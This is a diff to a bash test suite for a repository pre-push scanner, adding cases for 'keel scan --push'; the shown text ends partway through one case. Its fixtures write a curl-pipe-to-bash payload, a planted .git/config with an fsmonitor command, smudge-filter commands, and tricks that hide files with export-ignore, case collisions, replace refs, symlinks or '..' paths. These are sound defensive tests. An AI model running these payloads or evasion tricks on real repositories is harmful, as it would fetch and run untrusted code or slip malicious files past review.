@@ -2393,11 +2393,11 @@ case "$out" in
 esac
 rm -rf "$rk"
 
-# ---- verify.e2e and verify.security are named, and never run ---------------
+# ---- verify.e2e is named and never run, verify.security runs only in full doctor ---------------
 # verify.e2e and verify.security were written into every profile by write_profile and read by
 # nothing, so a user saw a real command sitting in a real field with nothing behind it. Doctor
-# names them without running them: e2e needs an environment doctor cannot provide and security
-# reaches the network.
+# names e2e without running it, because it needs an environment doctor cannot provide. security
+# reaches the network, so full doctor runs it and --fast only names it.
 #
 # fixture node-ts, NOT a bare git init. An empty directory detects as project.kind "docs", and the
 # whole verify block including this loop sits inside doctor's `kind != docs` guard, so on a bare
@@ -2405,10 +2405,10 @@ rm -rf "$rk"
 # like a bug in the new loop. Confirmed by running it on 2026-09-07.
 we="$(fixture node-ts)"
 ( cd "$we" && "$KEEL" init -y >/dev/null 2>&1 )
-# verify.e2e is a command that leaves evidence behind, not a plausible-looking one. The last two
-# cases assert doctor did not run it, and the only way to assert that without trusting the output
-# string is to give it something whose having run is a fact on disk. Relative, because doctor's
-# `( eval "$c" )` inherits the cwd this subshell sets.
+# verify.e2e is a command that leaves evidence behind, not a plausible-looking one. The e2e sentinel
+# cases below assert doctor did not run it, and the only way to assert that without trusting the
+# output string is to give it something whose having run is a fact on disk. Relative, because
+# doctor's `( eval "$c" )` inherits the cwd this subshell sets.
 #
 # `keel profile set` rather than a python heredoc. It is the idiom this file already uses, in the
 # cases that set a string containing spaces and clear a value to null, and it refuses a path the
@@ -2422,10 +2422,11 @@ case "$out" in
     ok "doctor names a declared verify.e2e without running it" ;;
   *) bad "doctor names a declared verify.e2e without running it" "$out" ;;
 esac
-# null reports as ok, not WARN. keel has no detector for either key, so a warning here fires on
-# every project ever created and no keel command can clear it; docs/standards.md:79 calls that the
-# unrecoverable kind of wrong. Asserting the `ok` prefix, because asserting the bare sentence
-# would pass a WARN too and that is the whole distinction this case exists to hold.
+# null reports as ok, not WARN. keel detects security only from an npm, pnpm or yarn 2+ lockfile and
+# e2e only from a node test:e2e script, so a warning here fires on nearly every project and no keel
+# command can clear it; docs/standards.md:79 calls that the unrecoverable kind of wrong. Asserting
+# the `ok` prefix, because asserting the bare sentence would pass a WARN too and that is the whole
+# distinction this case exists to hold.
 case "$out" in
   *'ok    verify.security is null'*) ok "doctor reports a null verify.security as ok, not a warning" ;;
   *) bad "doctor reports a null verify.security as ok, not a warning" "$out" ;;
@@ -2441,18 +2442,22 @@ else
 fi
 # The same assertion without --fast, and this is the one with teeth. A review proved by mutation
 # that the case above passes an implementation which runs the command but short-circuits on --fast:
-# nothing asserted under --fast can see such a path, so the sentinel there catches only a loop that
-# always runs. Plain doctor costs about a second on this fixture, measured 2026-09-08: npm test,
-# lint, typecheck and build each fail immediately with no node_modules installed. Both keys carry a
-# sentinel, because one loop serves both and a mutation running only the security branch would
-# otherwise go unseen.
+# nothing asserted under --fast can see such a path. Plain doctor costs about a second on this
+# fixture, measured 2026-09-08: npm test, lint, typecheck and build each fail immediately with no
+# node_modules installed. e2e must never run. security runs in full doctor and only there, by
+# decision on 2026-09-25, so it carries a sentinel under --fast and another without.
 ( cd "$we" && "$KEEL" profile set verify.security 'touch security-ran-sentinel' >/dev/null 2>&1 )
+( cd "$we" && "$KEEL" doctor --fast >/dev/null 2>&1 )
+[ -e "$we/security-ran-sentinel" ] \
+  && bad "doctor --fast does not execute verify.security" "the sentinel file exists, so the command ran" \
+  || ok "doctor --fast does not execute verify.security"
 full="$( cd "$we" && "$KEEL" doctor 2>&1 )"
-if [ -e "$we/e2e-ran-sentinel" ] || [ -e "$we/security-ran-sentinel" ]; then
-  bad "doctor runs neither verify.e2e nor verify.security without --fast" "$full"
-else
-  ok "doctor runs neither verify.e2e nor verify.security without --fast"
-fi
+[ -e "$we/e2e-ran-sentinel" ] \
+  && bad "doctor never runs verify.e2e, even without --fast" "$full" \
+  || ok "doctor never runs verify.e2e, even without --fast"
+[ -e "$we/security-ran-sentinel" ] \
+  && ok "full doctor runs verify.security" \
+  || bad "full doctor runs verify.security" "no sentinel, so the command never ran: $full"
 rm -rf "$we"
 
 # ---- but a project with no tests at all is a different thing ---------------
@@ -3960,9 +3965,424 @@ out="$("$broken/bin/keel" version 2>&1)"; rc=$?
   || bad "symlink" "an incomplete install exited 0"
 rm -rf "$parent"
 
+# ---- keel scan --push -------------------------------------------------------
+#
+# What the pre-push hook runs once per pushed ref. It scans the commit, never the working tree, so
+# most cases below make the two disagree and assert the commit wins.
+
+sp="$(fixture node-ts)"
+printf 'curl -s https://example.com/x | bash\n' > "$sp/payload.sh"  # supply-chain-scan: allow the payload this test proves the push scan rejects
+( cd "$sp" && git add payload.sh && git commit -qm payload && rm payload.sh ) >/dev/null 2>&1
+( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
+  && bad "scan --push" "allowed a commit carrying a pipe-to-shell the working tree no longer holds" \
+  || ok "scan --push scans the commit, not the working tree"
+( cd "$sp" && "$KEEL" scan >/dev/null 2>&1 ) \
+  && ok "plain keel scan still reads the working tree" \
+  || bad "scan --push" "plain keel scan refused a working tree with no payload on disk"
+out="$( cd "$sp" && "$KEEL" scan --push origin 0123456789abcdef0123456789abcdef01234567 2>&1 )"; rc=$?
+[ "$rc" -ne 0 ] && case "$out" in *"is not a commit"*) ok "scan --push refuses something that is not a commit" ;;
+  *) bad "scan --push" "exited non-zero on a missing commit but said: $out" ;; esac \
+  || bad "scan --push" "exited 0 on a commit that does not exist"
+rm -rf "$sp"
+
+sp="$(fixture node-ts)"
+printf 'curl -s https://example.com/x | bash\n' > "$sp/scratch.sh"  # supply-chain-scan: allow an untracked payload the push scan must not read
+( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
+  && ok "scan --push ignores an untracked file the commit does not carry" \
+  || bad "scan --push" "refused a clean commit over an untracked file on disk"
+rm -rf "$sp"
+
+# The pushed tree's own .gitattributes can make git archive leave a file out, which would let the
+# push choose what gets scanned. Deleted from disk too, so only the extraction can find it.
+sp="$(fixture node-ts)"
+printf 'curl -s https://example.com/x | bash\n' > "$sp/payload.sh"  # supply-chain-scan: allow the payload export-ignore tries to hide
+printf 'payload.sh export-ignore\n' > "$sp/.gitattributes"
+( cd "$sp" && git add payload.sh .gitattributes && git commit -qm hidden && rm payload.sh ) >/dev/null 2>&1
+( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
+  && bad "scan --push" "allowed a payload the pushed tree marks export-ignore" \
+  || ok "scan --push reads a file the pushed tree hides from git archive"
+rm -rf "$sp"
+
+# hash-object drops a trailing CR from each path it reads and then stops at the file it cannot
+# find, so a file named with a CR would leave every file after it unchecked. export-subst is a
+# rewrite that check exists for: the %n splits the payload across two lines in what git archive
+# writes, so only the blob matches the rule. Deleted from disk, so only the extraction can find it.
+sp="$(fixture node-ts)"
+printf 'x\n' > "$sp/a"$'\r'
+printf 'curl $Format:%%n$ x | bash\n' > "$sp/z.sh"  # supply-chain-scan: allow the payload export-subst tries to split
+printf 'z.sh export-subst\n' > "$sp/.gitattributes"
+( cd "$sp" && git add -A && git commit -qm subst && rm z.sh ) >/dev/null 2>&1
+( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
+  && bad "scan --push" "allowed a payload export-subst rewrites, behind a file named with a CR" \
+  || ok "scan --push checks every file against its blob, a CR-named one included"
+rm -rf "$sp"
+
+# Two paths this filesystem may hold as one file: a case pair, and a file beside a directory whose
+# name differs only in case. Whichever the disk keeps, the other cannot be scanned, so the scan
+# refuses. Built with plumbing, since no working tree on a case-folding disk can hold both. On a
+# case-sensitive filesystem there is no collision and the payload is simply found.
+sp="$(fixture node-ts)"
+pay="$( cd "$sp" && printf 'curl -s https://example.com/x | bash\n' | git hash-object -w --stdin )"  # supply-chain-scan: allow the payload a path collision tries to hide
+okb="$( cd "$sp" && printf 'echo ok\n' | git hash-object -w --stdin )"
+c="$( cd "$sp" && git commit-tree -m case "$(printf '100644 blob %s\tPayload.sh\n100644 blob %s\tpayload.sh\n' "$okb" "$pay" | git mktree)" )"
+( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
+  && bad "scan --push" "allowed a payload beside a path that differs from it only in case" \
+  || ok "scan --push refuses a payload a case collision would hide"
+sub="$( cd "$sp" && printf '100644 blob %s\tx\n' "$okb" | git mktree )"
+c="$( cd "$sp" && git commit-tree -m dir "$(printf '100644 blob %s\tA.sh\n040000 tree %s\ta.sh\n' "$pay" "$sub" | git mktree)" )"
+( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
+  && bad "scan --push" "allowed a payload beside a directory that differs from it only in case" \
+  || ok "scan --push refuses a payload a file-and-directory collision would hide"
+rm -rf "$sp"
+
+# git refuses to check out a path with a .git component, in any case, because it would configure the
+# repository it lands in, and git mktree builds one. The scan refuses such a commit before writing
+# anything, so a planted .git/config never becomes the scan's own configuration, whose
+# core.fsmonitor would run. The no-command assertion passes before the change too, since the old
+# scan read the working tree; it fails if the extraction ever reads the planted file.
+sp="$(fixture node-ts)"
+blob="$( cd "$sp" && printf '[core]\n\tfsmonitor = "touch %s/pwned; false"\n' "$sp" | git hash-object -w --stdin )"
+sub="$( cd "$sp" && printf '100644 blob %s\tconfig\n' "$blob" | git mktree )"
+c="$( cd "$sp" && git commit-tree -m planted "$(printf '040000 tree %s\t.git\n' "$sub" | git mktree)" )"
+out="$( cd "$sp" && "$KEEL" scan --push origin "$c" 2>&1 )"; rc=$?
+[ ! -e "$sp/pwned" ] && ok "scan --push never runs configuration a pushed tree plants" \
+  || bad "scan --push" "a planted .git/config ran a command"
+[ "$rc" -ne 0 ] && case "$out" in *"git refuses to check out"*) ok "scan --push refuses a commit holding a .git path" ;;
+  *) bad "scan --push" "refused a planted .git path but said: $out" ;; esac \
+  || bad "scan --push" "allowed a commit holding .git/config"
+c="$( cd "$sp" && git commit-tree -m planted "$(printf '040000 tree %s\t.GIT\n' "$sub" | git mktree)" )"
+( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
+  && bad "scan --push" "allowed a commit holding .GIT/config" \
+  || ok "scan --push refuses a .git path in any case"
+rm -rf "$sp"
+
+# A key added and then deleted inside the push reaches the remote in history.
+sp="$(fixture node-ts)"
+printf 'x\n' > "$sp/deploy.key"
+( cd "$sp" && git add deploy.key && git commit -qm key && git rm -q deploy.key && git commit -qm "drop key" ) >/dev/null 2>&1
+out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
+[ "$rc" -ne 0 ] && case "$out" in *"deploy.key"*) ok "scan --push refuses a key file a pushed commit added and a later one deleted" ;;
+  *) bad "scan --push" "refused, but did not name deploy.key: $out" ;; esac \
+  || bad "scan --push" "allowed a push whose history carries deploy.key"
+# Once the remote holds the commit that added it, the key is not this push's to carry.
+( cd "$sp" && git update-ref refs/remotes/origin/main HEAD~1 )
+( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
+  && ok "scan --push leaves history the remote already holds alone" \
+  || bad "scan --push" "refused over a key the remote-tracking branch already holds"
+rm -rf "$sp"
+
+# A key the remote already holds, changed in the push and then deleted, still sends the new key.
+sp="$(fixture node-ts)"
+printf 'old\n' > "$sp/deploy.key"
+( cd "$sp" && git add deploy.key && git commit -qm key && git update-ref refs/remotes/origin/main HEAD \
+  && printf 'new\n' > deploy.key && git commit -qam "rotate key" && git rm -q deploy.key && git commit -qm "drop key" ) >/dev/null 2>&1
+out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
+[ "$rc" -ne 0 ] && case "$out" in *"deploy.key"*) ok "scan --push refuses a key file a pushed commit changed and a later one deleted" ;;
+  *) bad "scan --push" "refused, but did not name deploy.key: $out" ;; esac \
+  || bad "scan --push" "allowed a push whose history carries a changed deploy.key"
+rm -rf "$sp"
+
+# A key a merge commit itself adds, in its resolution, shows in no plain diff of the history.
+sp="$(fixture node-ts)"
+( cd "$sp" && git switch -q -c side && printf 's\n' > s.txt && git add s.txt && git commit -qm side \
+  && git switch -q main && printf 'm\n' > m.txt && git add m.txt && git commit -qm m \
+  && git merge -q --no-ff --no-commit side && printf 'k\n' > prod.key && git add prod.key && git commit -qm merge \
+  && git rm -q prod.key && git commit -qm "drop key" ) >/dev/null 2>&1
+out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
+[ "$rc" -ne 0 ] && case "$out" in *"prod.key"*) ok "scan --push refuses a key file a merge commit added" ;;
+  *) bad "scan --push" "refused, but did not name prod.key: $out" ;; esac \
+  || bad "scan --push" "allowed a push whose merge commit added prod.key"
+rm -rf "$sp"
+
+# The tip's paths are looked up exactly, not through the filesystem: on a case-folding disk TEST.key
+# would read as present because the tip holds test.key. The two commits are built with plumbing,
+# since neither a working tree nor an index on such a disk can hold both names.
+sp="$(fixture node-ts)"
+mkdir -p "$sp/.keel"; printf 'x\n' > "$sp/test.key"
+printf 'test.key an expired fixture, no live credential\n' > "$sp/.keel/scan-allow"
+( cd "$sp" && git add test.key .keel/scan-allow && git commit -qm fixture && git update-ref refs/remotes/origin/main HEAD ) >/dev/null 2>&1
+live="$( cd "$sp" && printf 'live\n' | git hash-object -w --stdin )"
+c1="$( cd "$sp" && git commit-tree -p HEAD -m "add TEST.key" "$( { git ls-tree HEAD; printf '100644 blob %s\tTEST.key\n' "$live"; } | git mktree )" )"
+c2="$( cd "$sp" && git commit-tree -p "$c1" -m "drop TEST.key" 'HEAD^{tree}' )"
+out="$( cd "$sp" && "$KEEL" scan --push origin "$c2" 2>&1 )"; rc=$?
+[ "$rc" -ne 0 ] && case "$out" in *"TEST.key"*) ok "scan --push looks the tip's paths up exactly, case and all" ;;
+  *) bad "scan --push" "refused, but did not name TEST.key: $out" ;; esac \
+  || bad "scan --push" "allowed TEST.key because the tip holds test.key"
+rm -rf "$sp"
+
+# The history walk is checked: a walk that stops partway, on an object missing from a partial or
+# damaged clone, fails the scan rather than reading as a clean history.
+sp="$(fixture node-ts)"
+( cd "$sp" && printf 'a\n' > a.txt && git add a.txt && git commit -qm a \
+  && printf 'b\n' > b.txt && git add b.txt && git commit -qm b ) >/dev/null 2>&1
+t="$( cd "$sp" && git rev-parse 'HEAD~1^{tree}' )"
+rm -f "$sp/.git/objects/${t:0:2}/${t:2}"
+out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
+[ "$rc" -ne 0 ] && case "$out" in *"could not read the history"*) ok "scan --push fails when the history cannot be read" ;;
+  *) bad "scan --push" "failed on an unreadable history but said: $out" ;; esac \
+  || bad "scan --push" "passed a history git could not walk"
+rm -rf "$sp"
+
+# Executable bits come from the commit. In a plugin repository the scanner refuses an executable
+# outside its allowed set, and it reads the mode from the index of the copy it scans. This case
+# passes before the change too, since the working tree carries the same bit; it is here to fail if
+# the copy loses the mode.
+sp="$(fixture node-ts)"
+mkdir -p "$sp/.claude-plugin" "$sp/docs"
+printf '{"name":"example","version":"0.0.1"}\n' > "$sp/.claude-plugin/plugin.json"
+printf '#!/bin/sh\necho hi\n' > "$sp/docs/helper.sh"; chmod +x "$sp/docs/helper.sh"
+( cd "$sp" && git add .claude-plugin/plugin.json docs/helper.sh && git commit -qm exec ) >/dev/null 2>&1
+out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"
+case "$out" in *"docs/helper.sh [structural-executable]"*) ok "scan --push reads executable bits from the pushed commit" ;;
+  *) bad "scan --push" "did not flag an executable the commit carries: $out" ;; esac
+rm -rf "$sp"
+
+# A path with a .. component is refused as git refuses to check it out: it made the rewrite step
+# write a file outside the scan's own directory, anywhere this user can write.
+sp="$(fixture node-ts)"
+pay="$( cd "$sp" && printf 'curl -s https://example.com/x | bash\n' | git hash-object -w --stdin )"  # supply-chain-scan: allow the payload a .. path tries to place outside the scan
+sub="$( cd "$sp" && printf '100644 blob %s\tvictim\n' "$pay" | git mktree )"
+c="$( cd "$sp" && git commit-tree -m dotdot "$(printf '040000 tree %s\t..\n' "$sub" | git mktree)" )"
+out="$( cd "$sp" && "$KEEL" scan --push origin "$c" 2>&1 )"; rc=$?
+[ "$rc" -ne 0 ] && case "$out" in *"git refuses to check out"*) ok "scan --push refuses a commit holding a .. path" ;;
+  *) bad "scan --push" "refused a .. path but said: $out" ;; esac \
+  || bad "scan --push" "allowed a commit holding a .. path"
+rm -rf "$sp"
+
+# The rules read a file's name as well as its content, and the names come from the commit, not from
+# the disk: A.key beside a.KEY, the same blob, left only a.KEY on a case-folding disk, which the key
+# rule does not match.
+sp="$(fixture node-ts)"
+kb="$( cd "$sp" && printf 'x\n' | git hash-object -w --stdin )"
+c="$( cd "$sp" && git commit-tree -m names "$(printf '100644 blob %s\tA.key\n100644 blob %s\ta.KEY\n' "$kb" "$kb" | git mktree)" )"
+out="$( cd "$sp" && "$KEEL" scan --push origin "$c" 2>&1 )"; rc=$?
+[ "$rc" -ne 0 ] && case "$out" in *"A.key [structural-secret-material]"*) ok "scan --push reads every name the commit holds, not the one the disk kept" ;;
+  *) bad "scan --push" "refused, but not for A.key: $out" ;; esac \
+  || bad "scan --push" "allowed A.key beside a.KEY"
+rm -rf "$sp"
+
+# A key path that changes type in the push, a symlink on the remote becoming a real key file, is a
+# change git reports as T, not A or M, and deleting it later still sends the key.
+sp="$(fixture node-ts)"
+( cd "$sp" && ln -s elsewhere deploy.key && git add deploy.key && git commit -qm link && git update-ref refs/remotes/origin/main HEAD \
+  && rm deploy.key && printf 'real\n' > deploy.key && git add deploy.key && git commit -qm "real key" \
+  && git rm -q deploy.key && git commit -qm "drop key" ) >/dev/null 2>&1
+out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
+[ "$rc" -ne 0 ] && case "$out" in *"deploy.key"*) ok "scan --push refuses a key file a pushed commit changed from a symlink" ;;
+  *) bad "scan --push" "refused, but did not name deploy.key: $out" ;; esac \
+  || bad "scan --push" "allowed a push whose history turns a symlink into deploy.key"
+rm -rf "$sp"
+
+# A tip holding a key path as a directory does not hold the key: deploy.key/notes.txt is not a key
+# file, and the key a pushed commit added under that name is still in history.
+sp="$(fixture node-ts)"
+( cd "$sp" && printf 'x\n' > deploy.key && git add deploy.key && git commit -qm key && git rm -q deploy.key \
+  && mkdir deploy.key && printf 'n\n' > deploy.key/notes.txt && git add deploy.key/notes.txt && git commit -qm dir ) >/dev/null 2>&1
+out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
+[ "$rc" -ne 0 ] && case "$out" in *"deploy.key [structural-secret-material]"*) ok "scan --push counts only a file in the tip as holding a key path" ;;
+  *) bad "scan --push" "refused, but not for deploy.key: $out" ;; esac \
+  || bad "scan --push" "allowed a key the tip replaced with a directory of the same name"
+rm -rf "$sp"
+
+# The history walk reads no porcelain configuration: with log.showRoot false, git log shows nothing
+# a root commit added, so a key added in the first commit of a new history and deleted later passed.
+sp="$(fixture node-ts)"
+( cd "$sp" && git config log.showRoot false && git checkout -q --orphan fresh && git rm -rqf . \
+  && printf 'x\n' > root.key && git add root.key && git commit -qm root \
+  && git rm -q root.key && printf 'a\n' > a.txt && git add a.txt && git commit -qm "drop key" ) >/dev/null 2>&1
+out="$( cd "$sp" && "$KEEL" scan --push origin fresh 2>&1 )"; rc=$?
+[ "$rc" -ne 0 ] && case "$out" in *"root.key"*) ok "scan --push reads a root commit's additions whatever log.showRoot says" ;;
+  *) bad "scan --push" "refused, but did not name root.key: $out" ;; esac \
+  || bad "scan --push" "allowed a key a root commit added, with log.showRoot false"
+rm -rf "$sp"
+
+# Replace refs change what git reads and not what push sends: a scan of a commit replaced by a clean
+# one read the clean one, while a push delivers the payload.
+sp="$(fixture node-ts)"
+printf 'curl -s https://example.com/x | bash\n' > "$sp/payload.sh"  # supply-chain-scan: allow the payload a replace ref tries to hide
+( cd "$sp" && git add payload.sh && git commit -qm bad ) >/dev/null 2>&1
+bad_c="$( cd "$sp" && git rev-parse HEAD )"
+( cd "$sp" && git rm -q payload.sh && git commit -qm good && git replace "$bad_c" HEAD ) >/dev/null 2>&1
+( cd "$sp" && "$KEEL" scan --push origin "$bad_c" >/dev/null 2>&1 ) \
+  && bad "scan --push" "allowed a payload a replace ref stands in front of" \
+  || ok "scan --push reads the commit being pushed, not a replacement"
+rm -rf "$sp"
+
+# The files are written with no filter the pushed tree names: git archive ran a smudge command a
+# pushed .gitattributes selected. This case passes before the change too, since the old scan read
+# the working tree; it fails if the extraction ever runs one.
+sp="$(fixture node-ts)"
+printf 'a\n' > "$sp/a.txt"; printf 'a.txt filter=demo\n' > "$sp/.gitattributes"
+( cd "$sp" && git add a.txt .gitattributes && git commit -qm attr && git config filter.demo.smudge "touch $sp/smudged; cat" ) >/dev/null 2>&1
+( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 )
+[ ! -e "$sp/smudged" ] && ok "scan --push runs no filter the pushed tree names" \
+  || bad "scan --push" "a filter the pushed .gitattributes named ran during the scan"
+rm -rf "$sp"
+
+# No symlink is ever written: on a case-folding disk a symlink x beside a directory X/ replaced
+# the directory, and the files under X/ were then written through it, outside the scan. The
+# outside directory is this fixture's own. It stays untouched before the change too, since the old
+# scan read the working tree; the refusal is what fails first.
+sp="$(fixture node-ts)"; mkdir -p "$sp-out"
+pay="$( cd "$sp" && printf 'curl -s https://example.com/x | bash\n' | git hash-object -w --stdin )"  # supply-chain-scan: allow the payload a symlink tries to write outside the scan
+ysub="$( cd "$sp" && printf '100755 blob %s\ty\n' "$pay" | git mktree )"
+lnk="$( cd "$sp" && printf '%s' "$sp-out" | git hash-object -w --stdin )"
+c="$( cd "$sp" && git commit-tree -m link "$(printf '040000 tree %s\tX\n120000 blob %s\tx\n' "$ysub" "$lnk" | git mktree)" )"
+( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
+  && bad "scan --push" "allowed a directory beside a symlink of the same name folded" \
+  || ok "scan --push refuses a directory beside a symlink of the same name folded"
+[ -z "$(ls -A "$sp-out")" ] && ok "scan --push writes nothing outside its own directory" \
+  || bad "scan --push" "the scan wrote outside its directory: $(ls -A "$sp-out")"
+rm -rf "$sp" "$sp-out"
+
+# Where the filesystem keeps an executable bit, the disk must match the commit's mode: Run.sh at
+# 100755 beside run.sh at 100644, the same blob, left one file on a case-folding disk that neither
+# name found executable, so the rules scoped to executables never ran over it.
+sp="$(fixture node-ts)"
+net="$( cd "$sp" && printf 'curl -s https://example.com/version\n' | git hash-object -w --stdin )"  # supply-chain-scan: allow a network call the push scan must see in an executable
+c="$( cd "$sp" && git commit-tree -m modes "$(printf '100755 blob %s\tRun.sh\n100644 blob %s\trun.sh\n' "$net" "$net" | git mktree)" )"
+( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
+  && bad "scan --push" "allowed an executable beside a same-content file that differs only in case and mode" \
+  || ok "scan --push refuses a case pair that differs in mode"
+rm -rf "$sp"
+
+# .keel/scan-allow is honoured only where the commit holds that exact path as a file. A case-folding
+# disk answered to it for .keel/SCAN-ALLOW, and a symlink by that name was written as a file holding
+# its target, so either handed the scan an allow list the commit did not hold. The commit's own allow
+# list, held as a file, is still honoured.
+sp="$(fixture node-ts)"
+kb="$( cd "$sp" && printf 'x\n' | git hash-object -w --stdin )"
+al="$( cd "$sp" && printf 'secret.key an expired fixture\n' | git hash-object -w --stdin )"
+ksub="$( cd "$sp" && printf '100644 blob %s\tSCAN-ALLOW\n' "$al" | git mktree )"
+c="$( cd "$sp" && git commit-tree -m alias "$(printf '040000 tree %s\t.keel\n100644 blob %s\tsecret.key\n' "$ksub" "$kb" | git mktree)" )"
+( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
+  && bad "scan --push" "honoured .keel/SCAN-ALLOW as the allow list" \
+  || ok "scan --push honours no allow list the commit does not hold by its exact name"
+lsub="$( cd "$sp" && printf '120000 blob %s\tscan-allow\n' "$al" | git mktree )"
+c="$( cd "$sp" && git commit-tree -m link "$(printf '040000 tree %s\t.keel\n100644 blob %s\tsecret.key\n' "$lsub" "$kb" | git mktree)" )"
+( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
+  && bad "scan --push" "honoured a symlink named .keel/scan-allow as the allow list" \
+  || ok "scan --push honours no allow list held as a symlink"
+gsub="$( cd "$sp" && printf '100644 blob %s\tscan-allow\n' "$al" | git mktree )"
+c="$( cd "$sp" && git commit-tree -m allowed "$(printf '040000 tree %s\t.keel\n100644 blob %s\tsecret.key\n' "$gsub" "$kb" | git mktree)" )"
+( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
+  && ok "scan --push honours an allow list the commit holds as a file" \
+  || bad "scan --push" "refused a key the commit's own .keel/scan-allow lists"
+# A history path with a . component names the tip's own file when looked up as <commit>:<path>, so a
+# live key an intermediate commit held at ./secret.key read as the allowed fixture at secret.key.
+( cd "$sp" && git update-ref refs/remotes/origin/main "$c" )
+live="$( cd "$sp" && printf 'live\n' | git hash-object -w --stdin )"
+dsub="$( cd "$sp" && printf '100644 blob %s\tsecret.key\n' "$live" | git mktree )"
+mid="$( cd "$sp" && git commit-tree -p "$c" -m mid "$(printf '040000 tree %s\t.keel\n100644 blob %s\tsecret.key\n040000 tree %s\t.\n' "$gsub" "$kb" "$dsub" | git mktree)" )"
+tip="$( cd "$sp" && git commit-tree -p "$mid" -m tip "$c^{tree}" )"
+out="$( cd "$sp" && "$KEEL" scan --push origin "$tip" 2>&1 )"; rc=$?
+[ "$rc" -ne 0 ] && case "$out" in *"./secret.key"*) ok "scan --push checks a history path with a . component outright" ;;
+  *) bad "scan --push" "refused, but did not name ./secret.key: $out" ;; esac \
+  || bad "scan --push" "allowed a live key an intermediate commit held at ./secret.key"
+rm -rf "$sp"
+
+# A SHA-256 repository is scanned, not refused: the scan repository names objects the way the pushed
+# one does. This case passes before the change too, since the old scan read the working tree.
+sp="$(mktemp -d)"
+( cd "$sp" && git init -q --object-format=sha256 -b main . && git config user.email t@t.t && git config user.name t \
+  && printf 'a\n' > a.txt && git add a.txt && git commit -qm init ) >/dev/null 2>&1
+( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
+  && ok "scan --push reads a SHA-256 repository" \
+  || bad "scan --push" "refused a clean commit in a SHA-256 repository"
+rm -rf "$sp"
+
+# In a linked worktree git runs the hook with GIT_DIR set. The scan's own git commands must not
+# write into that repository. The commit scanned is main, which holds a file the worktree's HEAD
+# does not, so a git add that leaked into the worktree's index would show in its status. This case
+# passes before the change too; it fails if the scan's git environment is not cleared.
+sp="$(fixture node-ts)"
+( cd "$sp" && git worktree add -q "$sp-wt" -b wt && printf 'b\n' > b.txt && git add b.txt && git commit -qm b ) >/dev/null 2>&1
+( cd "$sp-wt" && GIT_DIR="$(git rev-parse --absolute-git-dir)" "$KEEL" scan --push origin main >/dev/null 2>&1 )
+[ -z "$( cd "$sp-wt" && git status --porcelain )" ] \
+  && ok "scan --push in a linked worktree leaves that worktree's index alone" \
+  || bad "scan --push" "the linked worktree's status changed: $( cd "$sp-wt" && git status --porcelain | head -3 )"
+rm -rf "$sp" "$sp-wt"
+
+# The scan repository reads names as the commit has them. git on macOS precomposes the names it
+# reads from disk, so a decomposed café.key was listed twice, as the tracked name and as an
+# untracked precomposed one, and the copy the allow list did not name stopped the scan. Elsewhere
+# git precomposes nothing, and this case passes before the change too.
+sp="$(fixture node-ts)"
+kb="$( cd "$sp" && printf 'x\n' | git hash-object -w --stdin )"
+nfd="$(printf 'cafe\314\201.key')"
+al="$( cd "$sp" && printf '%s an expired fixture\n' "$nfd" | git hash-object -w --stdin )"
+ksub="$( cd "$sp" && printf '100644 blob %s\tscan-allow\n' "$al" | git mktree )"
+c="$( cd "$sp" && git commit-tree -m nfd "$(printf '040000 tree %s\t.keel\n100644 blob %s\t%s\n' "$ksub" "$kb" "$nfd" | git mktree)" )"
+out="$( cd "$sp" && "$KEEL" scan --push origin "$c" 2>&1 )" \
+  && ok "scan --push reads a decomposed name once, as the commit holds it" \
+  || bad "scan --push" "refused an allow-listed key with a decomposed name: $out"
+rm -rf "$sp"
+
+# A git older than 2.32 ignores GIT_CONFIG_GLOBAL and reads ~/.gitconfig, and every git reads the
+# default global attributes file under XDG_CONFIG_HOME, so this user's own filter still ran over the
+# pushed tree. A shim that drops GIT_CONFIG_GLOBAL stands in for the older git.
+sp="$(fixture node-ts)"; fh="$(mktemp -d)"; shim="$(mktemp -d)"
+mkdir -p "$fh/.config/git"
+printf '[filter "demo"]\n\tsmudge = touch %s/smudged; cat\n' "$fh" > "$fh/.gitconfig"
+printf '* filter=demo\n' > "$fh/.config/git/attributes"
+printf '#!/bin/sh\nunset GIT_CONFIG_GLOBAL\nexec %s "$@"\n' "$(command -v git)" > "$shim/git"; chmod +x "$shim/git"
+( cd "$sp" && printf 'a\n' > a.txt && git add a.txt && git commit -qm a ) >/dev/null 2>&1
+( cd "$sp" && HOME="$fh" XDG_CONFIG_HOME="$fh/.config" PATH="$shim:$PATH" "$KEEL" scan --push origin HEAD >/dev/null 2>&1 )
+[ ! -e "$fh/smudged" ] && ok "scan --push runs no filter this user's global configuration names" \
+  || bad "scan --push" "a filter from the global config and attributes ran during the scan"
+rm -rf "$sp" "$fh" "$shim"
+
+# An allow-list entry covers the version of the path the tip holds, the one that was reviewed, and
+# no other. A live key a pushed commit put at the allowed path passed when a later commit put the
+# fixture back, or deleted it, before the tip.
+sp="$(fixture node-ts)"
+mkdir -p "$sp/.keel"; printf 'fixture\n' > "$sp/test.key"
